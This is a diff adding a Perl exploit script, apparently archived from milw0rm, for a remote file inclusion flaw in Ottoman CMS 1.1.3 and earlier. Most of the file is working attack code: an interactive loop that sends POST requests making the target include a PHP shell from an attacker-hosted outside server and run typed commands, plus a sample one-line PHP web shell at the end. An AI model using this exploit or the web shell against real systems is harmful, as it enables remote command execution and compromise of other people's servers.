@@ -1,0 +1,126 @@
+#!/usr/bin/perl
+use IO::Socket;
+
+
+################################################################################
+#                                                                              #
+#         Jacek Wlodarczyk (j4ck) - jacekwlo[at]gmail[dot]com                  #
+#                                                                              #
+################################################################################
+
+
+
+
+#Title:       Ottoman CMS <= 1.1.3 Remote File Inclusion Exploit
+#Application: Ottoman Content Management System
+#Version:     1.1.3 and prior
+#Url:         http://www.lowter.com/p/ottoman
+
+
+
+#Affected software description:
+
+#Input passed to the "default_path" parameter in "index.php", "error.php", "classes/main_class.php", "format_css.php", "js.php",
+#and "rss.php" is not properly sanitized before being used to include files.
+#Vulnerable scripts not properly sanitizing user-supplied input to the 'POST' and 'COOKIE' variables.
+#This can be exploited to execute arbitrary PHP code by including files from local or external resources.
+#Exploitation requires turn ON "register_globals"
+
+#PoC Exploit (POST method):
+
+
+
+if (@ARGV ne 4)
+  {
+    &usage;
+  }
+
+
+sub usage()
+{
+  print "\r\n (c) Jacek Wlodarczyk (j4ck)\r\n\r\n";
+  print "- Exploit for Ottoman CMS <= 1.1.3\r\n\r\n";
+  print "- Usage: $0 <target> <script location> <shell location> <shell variable>\r\n";
+  print "- <target>             -> Victim's target eg: http://www.victim.com\r\n";
+  print "- <script location>    -> Path to script  eg: /ottoman/error.php\r\n";
+  print "- <cmd shell location> -> eg: http://www.site.com/sh_dir/\r\n";
+  print "- <cmd shell variable> -> eg: cmd\r\n\r\n";
+  print "- Eg: http://127.0.0.1 /ottoman_v1.1.3/index.php http://10.0.0.10/sh_dir/ cmd\r\n\r\n";
+  exit();
+}
+
+
+
+
+$HOST     = $ARGV[0];
+$DIR      = $ARGV[1];
+$INC_FILE = $ARGV[2];
+$CMD      = $ARGV[3];
+$COMMAND  = '';
+
+print "\r\nATTACKING : ".$HOST.$DIR."\r\n\r\n";
+$HOST =~ s/(http:\/\/)//;
+       
+
+while()
+  {
+
+    print "[shell] \$";
+    chomp($COMMAND = <STDIN>);
+    if ($COMMAND eq "q")
+      {
+        exit;
+      }
+
+    if (!$COMMAND)
+      {
+        print "\nPlease Enter a Command\n\n";
+        next;
+      }
+
+
+    $data="default_path=".$INC_FILE."&".$CMD."=".$COMMAND;
+    $post = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$HOST", PeerPort => "80") || die "Error 404\r\n\r\n";
+
+    print $post "POST ".$DIR." HTTP/1.1\r\n";
+    print $post "Host: ".$HOST."\r\n";
+    print $post "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4\r\n";
+    print $post "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+    print $post "Accept-Language: en-us;q=0.7,en;q=0.3\r\n";
+    print $post "Accept-Encoding: gzip,deflate\r\n";
+    print $post "Connection: Keep-Alive\r\n";
+    print $post "Keep-Alive: 300\r\n";
+    print $post "Cache-Control: no-cache\r\n";
+    print $post "Content-Type: application/x-www-form-urlencoded\r\n";
+    print $post "Content-Length: ".length($data)."\r\n";
+    print $post "Connection: close\r\n\r\n";
+    print $post $data."\r\n";
+
+
+
+
+
+    while ($ans = <$post>)
+      {
+        if ($ans =~ /404/ )
+          {
+            printf "\n\nFile ".$ARGV[1]." no exists.\r\n\r\n";
+            exit;
+          }
+        printf $ans;
+      }
+
+  }
+exit;
+
+
+#Shell example:
+
+#config.php
+#------cut---------------
+#<?
+#passthru($_POST['cmd']);
+#?>
+#------cut---------------
+
+# milw0rm.com [2006-07-09]
